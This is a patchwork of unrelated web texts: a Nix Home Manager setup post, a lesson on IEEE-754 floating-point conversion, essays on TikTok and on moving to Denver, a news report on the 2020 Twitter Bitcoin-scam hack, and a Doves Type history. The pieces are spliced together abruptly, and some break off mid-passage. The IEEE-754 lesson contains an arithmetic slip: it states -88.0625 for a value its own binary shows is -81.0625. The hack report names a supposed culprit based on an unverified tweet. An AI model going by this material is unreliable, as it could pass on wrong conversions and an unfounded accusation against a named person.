href="https://www.youtube.com/channel/UCSW5DqTyfOI9sUvnFoCjBlQ" target="_blank">Burke Libbey<sup><i></i></sup></a>‘s excellent YouTube series reawakened my interest. So I gave it a try, started hacking on a <a href="https://github.com/lucperkins/nix-home-config" target="_blank">config<sup><i></i></sup></a>, and soon I had a light bulb moment.</p><blockquote><p>You can see my current Home Manager config in my <a href="https://github.com/lucperkins/nix-home-config" target="_blank">lucperkins/nix-home-config<sup><i></i></sup></a> repo on GitHub, which includes usage instructions in case you want to give my config a spin and make your own modifications. Clone and fork away!</p></blockquote><p>The end result:</p><ul><li>I have a <a href="https://github.com/lucperkins/nix-home-config/blob/master/home.nix#L32-L91" target="_blank">long list<sup><i></i></sup></a> of packages that Home Manager installs for me. All I have to do is run <code>home-manager switch</code> and installation just works.</li><li>The Git configuration that I used to manually manage in <code>~/.gitconfig</code> and <code>~/.gitignore</code> is now encapsulated in one <a href="https://github.com/lucperkins/nix-home-config/blob/master/git.nix" target="_blank">git.nix<sup><i></i></sup></a> file.</li><li>My <a href="https://github.com/lucperkins/nix-home-config/blob/master/neovim.nix" target="_blank">Neovim<sup><i></i></sup></a> config is all in one file (no more <code>.vimrc</code>)</li><li>My <a href="https://github.com/tmux/tmux" target="_blank">tmux<sup><i></i></sup></a> config lives in <a href="https://github.com/lucperkins/nix-home-config/blob/master/tmux.nix" target="_blank">tmux.nix<sup><i></i></sup></a></li><li>My shell config for both zsh and <a href="https://fishshell.com/" target="_blank">Fish<sup><i></i></sup></a> lives in <a href="https://github.com/lucperkins/nix-home-config/blob/master/shell.nix" target="_blank">shell.nix<sup><i></i></sup></a>, including all my shell aliases and everything I’d ordinarily put in my <code>.zshrc</code> file.</li></ul><h3 id="snag">One little snag</h3><p>The one thing I had to come up with my own solution for is environment variables that I don’t want to commit to Git. I certainly don’t want to be sharing my <code>HEROKU_API_KEY</code> or <code>STRIPE_API_KEY</code> with the world. So I placed all my private env vars in a file at <code>~/.env</code> and added this in my <code>.zshrc</code>:</p><div><pre><code data-lang="shell"><span>if</span> <span>[</span> -e ~/.env <span>]</span>; <span>then</span>

</code></pre></div><p>There may be a more elegant, Nix-y approach to that but this works fine.</p><h3 id="exceptions">Exceptions</h3><p>Although I now use Home Manager as a full replacement for Homebrew, there are still some things that I manage manually:</p><ul><li>I install <a href="https://rustup.rs/" target="_blank">rustup<sup><i></i></sup></a> using Home Manager but manage Rust versions manually using that tool.</li><li>In principle you could use Home Manager to install and run <a href="https://docker.com/" target="_blank">Docker<sup><i></i></sup></a> and <a href="https://postgresql.org/" target="_blank">PostgreSQL<sup><i></i></sup></a>, but experimentation has shown that it’s much easier to just use <a href="https://docs.docker.com/docker-for-mac" target="_blank">Docker for Mac<sup><i></i></sup></a> and <a href="https://postgresapp.com/" target="_blank">Postgres.app<sup><i></i></sup></a>, respectively.</li></ul><h2 id="how">How it works</h2><p>I won’t get too deep into the weeds of how <a href="https://nixos.org/nix" target="_blank">Nix<sup><i></i></sup></a> works in general, but I will say a bit about Home Manager. Basically Home Manager is a set of Nix functions that convert your supplied <a href="https://github.com/lucperkins/nix-home-config" target="_blank">configuration<sup><i></i></sup></a> into a unitary, symlinked filesystem under <code>/nix/store</code>. Home Manager creates a “home” directory with a path like this:</p><div><pre><code data-lang="shell">/nix/store/7zd60q7jzzg827z4ig7fyxsgh4yv5ym4-home-manager-path
</code></pre></div><p>All the packages specified in your configuration are placed under the <code>bin</code> directory there, each of which is symlinked to a specific package in your Nix store. Here’s what this looks like:</p><div><pre><code data-lang="shell">readlink <span>$(</span>which home-manager<span>)</span>
/nix/store/l0bd74aj0i25gmd72ayng63m0ma95qsg-home-manager-path/bin/home-manager

ls /nix/store/l0bd74aj0i25gmd72ayng63m0ma95qsg-home-manager-path/bin

/nix/store/l0bd74aj0i25gmd72ayng63m0ma95qsg-home-manager-path/bin/ruby
</code></pre></div><p>To update your environment, run <code>home-manager switch</code>. This builds a brand new Home Manager directory and generates new dotfiles for you and quite a lot else. I’d recommend running <code>tree</code> on that directory to see how it’s structured. If you poke around long enough you’ll find your generated config files, linked libraries, man pages, and more.</p><p>The beauty of Nix is that every time you update your configuration, even a little tiny bit, you get a brand new <code>/nix/store/***-home-manager-path</code> directory with a new hashed path. This ensures that nothing is ever linking to the wrong place and that you <em>never</em> get collisions. To garbage collect your old paths, just run <code>nix-collect-garbage</code>.</p><p>If you’re ever curious whether a package is available in the main <a href="https://github.com/NixOS/nixpkgs" target="_blank">nixpkgs<sup><i></i></sup></a> store, you can just run, for example, <code>nix search jq</code>. Thus far I’ve been able to get everything I need through nixpkgs, with the exception of a handful of things I’ve need to install using tools like <a href="https://pypi.org/project/pip" target="_blank">pip<sup><i></i></sup></a> and <a href="https://yarnpkg.com/" target="_blank">yarn<sup><i></i></sup></a>.</p><h2 id="conclusions">Conclusions</h2><p>If Homebrew works for you, great. Stick with it. It’s a really good tool. But if you’re feeling adventurous and want to try out a fully declarative approach to your macOS environment, Home Manager is a fantastic option.</p><p>I should also note that there’s no reason you can’t use both. In fact, I may end up needing to re-install Homebrew one of these days. But for now I’m humming along without it and having a lot of fun tweaking my settings, confident that Nix’s purity will forge a safe and worry-free path.</p></div></div>]]>

<h2>Learning Objectives</h2>



<ul><li>Understand the sections of a 32-bit and 64-bit IEEE-754 number.</li><li>Memorize the exponent <em>bias</em> for a 32-bit and 64-bit IEEE-754 exponent.</li></ul>



<h2>IEEE-754 Format</h2>



<p>IEEE-754 is just a fancy name for a standard that tells you (and the computer) how to arrange 32-bits or 64-bits. In this case, it's how you arrange these bits to allow for <em><strong>scientific notation</strong></em>, which is how we <em>float</em> the decimal. We can move the decimal place left by decreasing the exponent, or we can move the decimal place right by increasing the exponent. The following equations show how the exponent affects the decimal's location.</p>



<p>\(\)$$1.23\times~10^3=1230$$</p>



<p>$$1.23\times~10^{-3}=.00123$$</p>



<p>As you can see here, there are three (3) fields that IEEE-754 defines: (1) a sign (0 = positive, 1 = negative), (2) an exponent, and (3) a fraction. The sign is either a 0 or 1, and it DOES NOT follow two's complement. There is a -0 and a +0. The exponent is the exponent of base 2. The fraction is everything to the right of the decimal point. So, \(1.234\times~10^7\) would have a sign of 0 (positive), an exponent of 7 (not exactly, but stay with me so far), and a fraction of .234. This is all the information we need. Keep in mind that .234 is base 10. All IEEE-754 formats describe base 2. Just like x 10 to some power floats the decimal in base 10, if we multiply by 2 to some power, we can float the decimal in base 2. All IEEE-754 defines is scientific notation!</p>



<p>The exponent has a <strong><em>bias</em></strong>, which allows an unsigned number to have negative values. The exponent itself is an unsigned number. The 32-bit and 64-bit formats have different biases.</p>



<p>Take a number \(1.1101\times2^1\). Just like base 10, in base 2, when we multiply by 2, we move the decimal either right or left. So, the number becomes \(11.01_2=3.25_{10}\). In IEEE-754, the number must be 1.<em>something</em>. This is called <strong><em>normalized</em></strong>. So, we can't store 11.01 with an exponent of 0, we must store 1.101 with an exponent of 1. This is fairly easy to do by just adding or subtracting from the exponent until the decimal is directly after the 1. This gives us more bits to store in the fraction portion.</p>



<hr>



<h2>32-bit IEEE-754</h2>



<p>In C++, the 32-bit IEEE-754 number is used by the <strong><em>float</em></strong> data type in C++. In here, the 32-bits are arranged as follows.</p>



<div><figure><img src="https://courses.stephenmarz.com/wp-content/uploads/2020/04/ieee-754-32-bit.png" alt="" srcset="https://courses.stephenmarz.com/wp-content/uploads/2020/04/ieee-754-32-bit.png 622w, https://courses.stephenmarz.com/wp-content/uploads/2020/04/ieee-754-32-bit-300x61.png 300w" sizes="(max-width: 622px) 100vw, 622px"><figcaption>IEEE-754, 32-bit format. 1-bit sign, 8-bit exponent, 23-bit fraction. Bias is 127.</figcaption></figure></div>



<p>When we talk about a bias of 127, we mean that if we look at the 8-bit exponent in the 32-bit format, it's going to be 127 bigger than the actual exponent. So, if we want to figure out the actual exponent, we'd subtract 127. Say we had an exponent of \(1001\_1100_2=128+16+8+4=156_{10}\). So, we have a <em>biased</em> exponent of 156. We then subtract 127 from 156 to get the actual power of 2: \(156-127=29\). This means our number is \(1.\text{fraction}\times 2^{29}\).  The fraction is copied directly from the last 23 bits of the number. Recall that this is everything to the RIGHT of the decimal. The 1. portion is implied and is not explicitly in the 32-bits.</p>



<h3>32-bit Example</h3>



<p><em>Convert the following 32-bit number into decimal: 0x418e_0000.</em></p>



<p>First, we need to convert this into binary so we can parse out the 1-bit sign, 8-bit exponent, and 23-bit fraction:</p>



<p>$$418e\_0000_{16}=0100\_0001\_1000\_1110\_0000\_0000\_0000\_0000_2$$</p>



<p>The first bit is 0, which is a positive number. The next 8-bits are \(1000\_0011_2=128+2+1=131_{10}\), and the last 23-bits are \(.000111_2\). Since everything to the right of 0, we can ignore it. Just like 1.230 and 1.23 are identical, the same holds true for base 2.</p>



<p>Our exponent is 131, so we subtract the bias 127 to get an exponent of \(131-127=4\). The fractional portion was \(.000111\), and we have an implied 1., so we have \(1.000111\times 2^4\). Recall that a positive exponent moves the decimal right. In this case, it moves it to the right by four places. To remind yourself which way the decimal goes remember, bigger exponent means bigger number.</p>



<p>$$1.000111_2\times 2^4=10001.11_2$$</p>



<p>Now, we convert to base 10. Look to the left of the decimal first, \(10001_2=16+1=17_{10}\). Then, look to the right of the decimal: \(.11_2=0.5+0.25=0.75_{10}\). Putting the numbers together gives us \(17+0.75=17.75\).</p>



<p>So, 0x418e_0000 is the decimal value 17.75F.</p>



<h3>Another 32-bit Example</h3>



<p><em>Convert -81.0625 into 32-bit, IEEE-754 in hexadecimal.</em></p>



<p>Going the opposite direction still requires us to find three things: sign, exponent, and fraction. So, as always, first step: <em>convert to binary</em>.</p>



<p>\(-81.0625_{10}=-1010001.0001_2=1010001.001_2\times 2^0=-1.010001001_2\times 2^6\).</p>



<p>So, now we have it in binary and in <em>normalized</em> notation, that is 1.<em>something</em>. Now all we have to do is grab the sign, bias the exponent, and write down the fraction.</p>



<p>Sign = \(\text{negative}=1\)<br>Exponent = \(6+127=133_{10}=1000\_0101_2\)<br>Fraction = \(0100\_0100\_0100_2\)</p>



<p>So, the sign comes first, followed by the exponent, and finally the fraction--remember to keep adding zeroes until you get 23 total bits for the fraction.</p>



<pre>Sign   Exponent      Fraction
[1]    [1000 0101]   [0100 0100 0100 0000 0000 000]

1100 0010 1010 0010 0010 0000 0000 0000
C    2    A    2    2    0    0    0</pre>



<p>So, -81.0625 is 0xc2a2_2000 in 32-bit, IEEE-754 format.</p>



<hr>



<h2>64-bit IEEE-754 Format</h2>



<p>The 64-bit IEEE-754 format can be used in C++ by using the <strong><em>double</em></strong> data type. You will see that a double doesn't double every field, but instead gives you a somewhat bigger exponent, but a MUCH larger fraction space.</p>



<p>We still have three different fields: sign, exponent, and fraction, yet we have double space. Interestingly enough, the largest expansion is the fraction. The exponent only goes from 8 bits in 32-bit format to 11 bits in 64-bit format.</p>



<div><figure><img src="https://courses.stephenmarz.comu/wp-content/uploads/2020/04/ieee-754-64-bit-3.png" alt="" srcset="https://courses.stephenmarz.com/wp-content/uploads/2020/04/ieee-754-64-bit-3.png 750w, https://courses.stephenmarz.com/wp-content/uploads/2020/04/ieee-754-64-bit-3-300x50.png 300w" sizes="(max-width: 750px) 100vw, 750px"><figcaption>IEEE-754, 64-bit format. 1-bit sign, 11-bit exponent, 52-bit fraction. Bias is 1023.</figcaption></figure></div>



<h3>64-bit IEEE-754 Examples</h3>



<p><em>Convert 0xc054_4400_0000_0000 into decimal.</em></p>



<p>We need to parse out the three fields, so as always, convert to binary:</p>



<pre>C    0    5    4    4    4    0    0    0    0    0    0    0    0    0    0
1100 0000 0101 0100 0100 0100 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000</pre>



<p>We then pick out our 1-bit sign, 11-bit exponent, and 52-bit fraction:</p>



<p>Sign = 1 = <em><strong>negative</strong></em><br>Exponent = \(1000\_0000\_101_2=1029-1023=6\)<br>Fraction = \(1.0100\_0100\_01_2\)</p>



<p>You can see that I already subtracted the 64-bit bias (1023) to get an exponent of 6, and I already added the implied 1. to the fraction. So, now our number is as follows.</p>



<p>$$-1.0100\_0100\_01_2\times 2^6=-1010001.0001_2=-88.0625_{10}$$</p>



<p>So, 0xc054_4400_0000_0000 is the value -88.0625.</p>



<h3>Another 64-bit IEEE-754 Example</h3>



<p>Convert 17.75 into 64-bit, IEEE-754 format in hexadecimal.</p>



<p>First, convert to binary: \(17.75_{10}=10001.11_2\). Then, normalize the value: \(10001.11_2\times 2^0=1.000111_2\times 2^4\). So, now we have our sign (0=positive), our exponent (4), and our fraction (.000111). Now, bias our exponent by adding \(4+1023=1027_{10}=100\_0000\_0011_2\).</p>



<pre>Sign  Exponent        Fraction
[0]   [100 0000 0011] [0001 1100 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000]

0100 0000 0011 0001 1100 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000
4    0    3    1    C    0    0    0    0    0    0    0    0    0    0    0</pre>



<p>So, 17.75 is 0x4031_c000_0000_0000 in 64-bit IEEE-754 format.</p>



<hr>



<h2>C++ Float/Double</h2>



<p>C++ literals are different for float and double. The literal 1.0 is a double, whereas 1.0F is a float. This allows a programmer to tell C++ whether they want a 64-bit or 32-bit floating point data type.</p>

The US is looking<a href="https://www.aljazeera.com/news/2020/07/senate-committee-vote-bill-banning-tiktok-200715190147931.html" target="_blank"> <span>"into potential national security risks as it relates to the app."</span></a>&nbsp; After the announcement, #SaveTikTok and #TikTokBan were trending. The former has 398 million views while the latter has 225 million views. This story isn't just about banning TikTok, but about how bad actors can misdirect our attention.</p><p><strong>Why Did TikTok Capture Attention?&nbsp;</strong></p><p>Facebook is for Boomers, Instagram is for Millennials, and TikTok is for Gen-Z. TikTok monthly active users are about 800 million. TikTok's success boils down to a sophisticated AI that drives user engagement. As John Herrman aptly<a href="https://us.hidester.com/proxy.php?u=eJwBQQC%2B%2F3M6NTc6ItRHBViCQ175AXflK6MiidMKJoScGY6323zWCzyFh20oZ0aiWDXKwgv6ANUTHXGL8GpW7G8LKR5UzyI7YrAawQ%3D%3D&amp;b=7&amp;f=norefer" target="_blank"> </a><a href="https://www.nytimes.com/2019/03/10/style/what-is-tik-tok.html" target="_blank">describes for the NYTimes</a>:</p><blockquote><p><em>Imagine a version of Facebook that was able to fill your feed before you’d friended a single person. That’s TikTok.</em></p></blockquote><p>Taylor Lorenz <a href="https://www.theatlantic.com/technology/archive/2018/10/what-tiktok-is-cringey-and-thats-fine/573871/">writes in the Atlantic</a> what led to the initial success of TikTok:</p><blockquote><p><em>In a world where everyone’s content inevitably begins to look the same, TikTok videos feel bizarre and new. It’s an app full of people posting strange content to the internet with zero self-awareness or shame. That’s easy to mock, but it’s also what may lead to TikTok’s success.</em></p></blockquote><p>I must confess, I go on TikTok and 30-minutes later I’m still on the platform. Each video is as entertaining as the next one. The user experience reminds me of Wikipedia. I remember in middle school spending hours on Wikipedia going from one article to another. I would start by reading about Steve Jobs and end with learning about Peruvian Apple Cactus. There's even a game called the <a href="https://en.wikipedia.org/wiki/Wikipedia:Wiki_Game">Wikipedia Game</a> based on this concept. The player must go from Article X to Article Y by only clicking on Wikipedia links.</p><p>I digress.</p><p>But my anecdote serves a purpose. The website kept me on there as long as possible capturing my attention.</p><p>TikTok has captured the attention of not only users but of influencers. David Dobrik, the famed YouTube influencer, exclusively produces videos on TikTok. He hasn't posted a video to YouTube since April 24th. His <a href="https://www.tiktok.com/@daviddobrik?lang=en">TikTok page</a> has 19.6M followers about two million more than his YouTube page.</p><p>Established influencers aren't the only ones achieving success on the platform. No name creators go viral overnight. <a href="https://www.dexerto.com/entertainment/queen-of-alt-tiktok-mooptopia-suddenly-quits-after-rapid-rise-to-fame-1392966">Mooptopia</a>, a TikTok user, went from 1,000 followers to a million followers, to quitting the platform in under two weeks.</p><p>Users and influencers love TikTok. Our government does not.</p><p><strong>What's the Big Picture?</strong></p><p>Most TikTok videos are harmless. There is a video of a<a href="https://www.tiktok.com/@britishpromise.cats/video/6839416095586159878?region=PH&amp;mid=6839416100652894982&amp;u_code=d0l05f9835mcjm&amp;preview_pb=0&amp;language=en&amp;_d=dc1ghjb69gikhe&amp;share_item_id=6839416095586159878&amp;timestamp=1592478834&amp;user_id=6572491922367053826&amp;share_app_name=tiktok&amp;share_iid=6817097535460050689&amp;source=h5_t" target="_blank"> <span>cat looking into a cardboard box</span></a> with nearly 200 million views.

A massive campaign was undertaken on the platform to create fake attendees drawing a blow to the campaign.</p><p>On the surface, this seems like anti-Trump supporters playing a prank.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>On the 15<sup>th</sup> of July 2020, the social media world was taken by surprise. Official accounts of major celebrities on Twitter, a platform with over 330 million monthly users, were hacked to perpetuate a Bitcoin scam. This Twitter hack involved accounts that have millions of followers and were verified. This includes accounts of Elon Musk, Apple, Joe Biden, Jeff Bezos, Bill Gates, Kanye West, Kim Kardashian, Barack Obama, Mike Bloomberg, etc.</p><p>The hackers tweeted from these official accounts asking fans and followers of the hacked celebrities to send bitcoin to specific wallet addresses with the promise of doubling it and sending back. Specifically, most of the tweets requested for $1,000 and then promised to send back $2,000. So many Twitter users and followers of these accounts fell for the scam and the stolen amount of bitcoin is said to be equivalent to over $100,000.</p><p><img src="https://i1.wp.com/secureblitz.com/wp-content/uploads/2020/07/960x0.jpg?resize=640%2C407&amp;ssl=1" alt="" width="640" height="407" srcset="https://i1.wp.com/secureblitz.com/wp-content/uploads/2020/07/960x0.jpg?w=960&amp;ssl=1 960w, https://i1.wp.com/secureblitz.com/wp-content/uploads/2020/07/960x0.jpg?resize=300%2C191&amp;ssl=1 300w, https://i1.wp.com/secureblitz.com/wp-content/uploads/2020/07/960x0.jpg?resize=768%2C489&amp;ssl=1 768w" sizes="(max-width: 640px) 100vw, 640px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/secureblitz.com/wp-content/uploads/2020/07/960x0.jpg?w=960&amp;ssl=1 960w, https://i1.wp.com/secureblitz.com/wp-content/uploads/2020/07/960x0.jpg?resize=300%2C191&amp;ssl=1 300w, https://i1.wp.com/secureblitz.com/wp-content/uploads/2020/07/960x0.jpg?resize=768%2C489&amp;ssl=1 768w" data-lazy-src="https://i1.wp.com/secureblitz.com/wp-content/uploads/2020/07/960x0.jpg?resize=640%2C407&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p><p>From findings, this hack attack was well-planned and the hackers manage to gain internal access to Twitter’s system. Once in, they took control over verified accounts and accounts with millions of followers to launch the Bitcoin scam. Hours into the hack, Twitter reacted via its support handle stating that they were aware of the situation of things.</p><p>While they investigate and look for a resolution, Twitter users were advised to reset their passwords and some other account functionalities. At some point, accounts of some users, mostly verified users, were limited from tweeting on the social media platform.</p><p>Bitcoin scams are not new on Twitter but this happens to be the biggest and most successful in years. Tweeting from different official and verified handles at the same time is enough to convince oblivious users into transferring their Bitcoin. With the decentralization and blockchain technology of Bitcoin, tracking the identity of the hacker via the public wallet address has been fruitless.</p><p><strong>Read Also: <a href="https://secureblitz.com/the-must-dos-and-donts-for-protecting-your-password-and-personal-data/">The Must Dos And Don’ts For Protecting Your Password And Personal Data</a></strong></p><p>However, an unconfirmed update from an unverified Twitter user (@inteldotwav) revealed the hacker to be Samuel Hyde, an ex-developer at Twitter. Twitter is yet to officially respond to this claim.</p><p><img src="https://i1.wp.com/secureblitz.com/wp-content/uploads/2020/07/2.jpg?resize=441%2C632&amp;ssl=1" alt="" width="441" height="632" srcset="https://i1.wp.com/secureblitz.com/wp-content/uploads/2020/07/2.jpg?w=441&amp;ssl=1 441w, https://i1.wp.com/secureblitz.com/wp-content/uploads/2020/07/2.jpg?resize=209%2C300&amp;ssl=1 209w" sizes="(max-width: 441px) 100vw, 441px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/secureblitz.com/wp-content/uploads/2020/07/2.jpg?w=441&amp;ssl=1 441w, https://i1.wp.com/secureblitz.com/wp-content/uploads/2020/07/2.jpg?resize=209%2C300&amp;ssl=1 209w" data-lazy-src="https://i1.wp.com/secureblitz.com/wp-content/uploads/2020/07/2.jpg?resize=441%2C632&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p><p>If the hack is an inside job as the tweet claims, then, the security lapse is not a fault on the victim’s part. As a Twitter user, protecting your account to avoid being a victim of a hack like this is important. Twitter features <a href="https://help.twitter.com/en/managing-your-account/two-factor-authentication">2-factor-authentication</a> which is very ideal for account protection as it adds an extra layer of security to your login. Going back to basics, your password should be very secure with a mix of letters, numbers, and symbols.</p><div><ul><li><a href="#abh_about">Author</a></li><li><a href="#abh_posts">Recent Posts</a></li></ul><div><section itemscope="" itemprop="author" itemtype="http://schema.org/Person"><p><a href="https://secureblitz.com/author/johnray/" title="John Raymond"> <img src="https://i1.wp.com/secureblitz.com/wp-content/uploads/gravatar/john-raymond.jpg?w=250&amp;ssl=1" alt="John Raymond" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/secureblitz.com/wp-content/uploads/gravatar/john-raymond.jpg?w=250&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></p><div><p>John Raymond is an author, writer, and scriptwriter.

<h2>The Doves Type story.<span>&nbsp;</span></h2>


<p>The Doves Type legend is one of the most enduring in typographic history and probably the most infamous. It’s the story of a typeface and a bitter feud between the two partners of Hammersmith’s celebrated Doves Press, Thomas James Cobden-Sanderson and Emery Walker, leading to the protracted disposal of their unique metal type into London’s River Thames. Starting in 1913 with the initial dumping of the punches and matrices, by the end of January 1917 an increasingly frail Cobden-Sanderson had made hundreds of clandestine trips under cover of darkness to Hammersmith Bridge and systematically thrown 12lb parcels of metal type into the murky depths below. As one person so aptly commented on Twitter recently, this notorious tale bears all the hallmarks of a story by Edgar Allan Poe.</p>
<p>One century later and a new chapter has been added with the release of Robert Green’s digital facsimile of the Doves Type, available to <strong><a href="https://typespec.co.uk/doves-type/">buy and download from Typespec</a></strong>. For those who are still unfamiliar with the historical background and the designer’s arduous journey to salvage this beautiful typeface from its watery grave I would urge you to check out the following short BBC News film by Tom Beal, made after <a href="https://www.typespec.co.uk/recovering-the-doves-type/"><strong>the recovery in 2014 of some&nbsp;of the original type&nbsp;from the Thames:</strong></a></p>

<p>The original Doves Type was crafted by master punchcutter Edward Prince, based on drawings produced by Percy Tiffin of Nicolas Jenson’s pioneering 15th-century Venetian type. William Morris, founder of the Kelmscott Press, had actually developed his own ‘Golden’ type some years before The Doves Press came into being but Doves is held by experts as being more faithful to the original Venetian letterforms.</p>
<p>The Doves Type was commissioned in 1899 and created solely by Prince in 16 pt; it was used in all of the press’s publications including their iconic edition of the King James Bible. Each Doves Press book was beautifully bound and, notes Green, noticeably “stripped of decorative borders and illustration, the elegantly clear &amp; legible type acting alone as visual siren-song.”</p>

<p>By 1908, despite successful Milton prints &amp; the aforementioned Bible, the Press was in dire financial difficulty. Subscribers began melting away after Walker had effectively left in 1906 as the bitter &amp; acrimonious dispute took hold between the partners. On finally dissolving their partnership in 1909, Cobden-Sanderson began attempts to wriggle out of an earlier promise that, should the partnership cease, Walker would receive a fount of type ‘for his own use’. Walker retaliated, issuing a writ insisting that the Press shut down completely and he receive 50% of remaining assets. In 1909, the Press’s only valuable asset was the type.</p>
<p>A compromise was reached, brokered by their exasperated friend Sir Sydney Cockerell, which allowed Cobden-Sanderson uncontrolled use of the type for as long as he lived, at which time it would pass to Emery Walker, if he did not die first.</p>
<p>The thought of ‘his’ typeface being used by anyone else, and in a manner beyond his control, prompted Cobden-Sanderson’s now infamous course of action. Only the Doves Press, run exclusively by him, could be bestowed the honour of printing his type. And so the mission to destroy it, beginning with the punches and matrices on Good Friday 1913, began. On an almost nightly basis from August 1916 the ailing septuagenarian dumped the type into the Thames, wrapped in paper parcels and tied with string; “bequeathed to the river” as he put it in his personal diary. Every piece of this beautiful typeface, more than a ton of metal, was destroyed in a prolonged ritual sacrifice.</p>

<p>Green’s quest to re-produce the Doves Type in digital form has been a true labour of love, a project he came close to shelving on several occasions due to the paucity of (affordable) source texts and occasional blind alleys he was inadvertently taken down. Much agonising took place over the general approach to the project, deciphering the complex geometries, then individual letterform dilemmas due to ink spread inconsistencies and anomalies in the punches and matrices. The end result isn’t so much a revival as a ‘digital facsimile’ of the original typeface, but most importantly he’s succeeded in doing justice to it.</p>
<p>The first release (2013) in OpenType format was an Imprint weight, complete with ligatures and detailing from the metal predecessor; Green wanted to be as true to the original as possible but there are concessions to modern day requirements in the form of Dollar &amp; Euro currency symbols plus extended latin diacritics which didn’t feature first time around.</p>

<p>Doves Type® Regular, refined after <strong><a href="https://www.typespec.co.uk/recovering-the-doves-type/" target="_blank">recovery of the original metal type from the Thames</a>,</strong> replaces the initial 2013 release,&nbsp;improved in 2016 for contemporary usage. This <strong><a href="https://typespec.co.uk/doves-type/">latest release of the updated Doves Type®</a></strong> contains extended glyph coverage including small caps, together with both lining and tabular figures. Tracking and kerning have also been adjusted for 21st century usage. The original Doves Press type, cut for letterpress with its physical constraints and inherent quirks, contains spacing which would appear uncomfortable to modern eyes in web-based and litho applications.</p>

<p>Last week, during my weekly one-on-one with Jordan (a young sales rep), he asked me about a momentous life decision.</p>



<p>“Should I move back to the Bay Area or move to Denver?” Jordan moved back home after COVID-19 struck and was weighing his options about where to move to next.</p>



<p>My response: Don’t move to Denver if you care about your career.</p>



<p>His question was less about Denver and more about properly evaluating opportunity costs. Denver’s cost of living is astronomically lower than San Francisco’s. Plus, COVID-19 has rendered locations obsolete. You no longer need to be in the Bay Area because the virus has democratized access to tech jobs. Right?</p>



<p>Wrong!</p>



<p>The permanent shift to Remote Work is the most overhyped thing since Bitcoin.</p>



<p>Sure, COVID has caused more people to work remotely than ever before. But, central locations where people can meet in-person and collaborate will never vanish. I was on a call with a VP at Salesforce last week and he could not wait to get the hell out of his house. </p>



<p>According to Paul Graham, “One of the biggest things lost in remote work is chance meetings.”</p>



<figure><div>
<div><blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">I know about the power of chance meetings because Y Combinator is explicitly designed to magnify it. Whenever YC brings together any group of more than about 4 founders for any reason, there ends up being an important conversation between some pair of them.</p>— Paul Graham (@paulg) <a href="https://twitter.com/paulg/status/1270626376165527553?ref_src=twsrc%5Etfw">June 10, 2020</a></blockquote></div>
</div></figure>



<p>Similarly, Steve Jobs designed Pixar’s Headquarters to drive spontaneous conversations. In Walter Isaacson’s book, Jobs says “There’s a temptation in our networked age to think that ideas can be developed by email and iChat. That’s crazy. Creativity comes from spontaneous meetings, from random discussions. You run into someone, you ask what they’re doing, and soon you’re cooking up all sorts of ideas.”</p>



<p>This type of thinking is not exclusive to Y-Combinator and Apple. Serendipity has birthed countless groundbreaking companies in the Bay Area. Like the chance encounter that led to the first major investment in Facebook. Zuck and his crew were kickin’ it in the mean streets of Palo Alto when they ran into Sean Parker, who introduced them to Peter Thiel. He invested $500,000 in the social network. Facebook is now valued at $700 billion.&nbsp;</p>



<figure><img src="https://pyxis.nymag.com/v1/imgs/c0c/046/73d166a28d470935ed0166d32f24bb1731-23-peter-thiel-mark-zuckerberg.2x.rhorizontal.w700.jpg" alt="" width="670" height="446"><figcaption><a href="https://nymag.com/intelligencer/2018/01/is-peter-thiel-playing-mark-zuckerberg.html">https://nymag.com/intelligencer/2018/01/is-peter-thiel-playing-mark-zuckerberg.html</a></figcaption></figure>



<p>Additionally, <a href="https://www.saastr.com/maybe-80-of-public-saas-companies-are-in-the-sf-bay-area/">80% of all public SaaS companies are headquartered in the Bay Area</a>. COVID has been a boon for these businesses. Have you seen the recent valuations of Zoom, Okta, Crowdstrike, and Twilio? Where do you think most of the executives at these companies live? Chances are they will propel the next wave of hypergrowth SaaS companies right here in the Bay Area. Don’t believe me?&nbsp;</p>



<p>Georg Kurtz was at McAfee before he founded CrowdStrike. Todd McKinnon led development at Salesforce before he founded Okta. Eric Yuan was the VP of Engineering at Cisco before starting Zoom.&nbsp;This is the power of being in the Bay Area. If San Francisco is the Lebron James of tech, Denver is Brian Scalabrine. </p>



<figure><img src="https://clutchpoints.com/wp-content/uploads/2019/09/lebron-1.jpg" alt="" width="571" height="320"><figcaption><a href="https://clutchpoints.com/nba-news-brian-scalabrine-believes-lebron-james-cavs-prepared-for-spurs-instead-of-warriors-in-2014-15-season/" target="_blank" rel="noreferrer noopener">https://clutchpoints.com/nba-news-brian-scalabrine-believes-lebron-james-cavs-prepared-for-spurs-instead-of-warriors-in-2014-15-season/</a></figcaption></figure>



<p>I told Jordan that Denver is more expensive than the Bay Area if he properly factors in the opportunity cost of not living in a city that would give him 10,000x the opportunities.</p>



<p>Which brings me to Short-term vs. Long-term thinking.</p>



<p>I wish someone would’ve hammered this into my brain when I was younger. When you’re in your early 20’s, your biggest asset is time. You have lots of it and can leverage the power of compounding to achieve your wildest dreams. This is why you should strictly optimize for the long-term.&nbsp;</p>



<blockquote><p>“If you’re going to invent, it means you’re going to experiment, so you have to think long-term.”</p><p>Jeff Bezos</p></blockquote>



<p>Long-term compounding gives you the most leverage when it’s applied to things like investing and learning, not penny-pinching. Choosing to move to Denver instead of the Bay Area is optimizing for the cost of living which is the textbook definition of short-term thinking. Now, if Jordan had a family to support, I would be more empathetic to his contemplation of Denver over San Francisco. But, he didn’t. Call me an elitist, but if you want to have a wildly successful career in tech, saving $500 or $1000 a month on rent won’t mean shit in the long run. Especially, if the opportunity cost eradicates those savings which in Jordan’s case it would.</p>



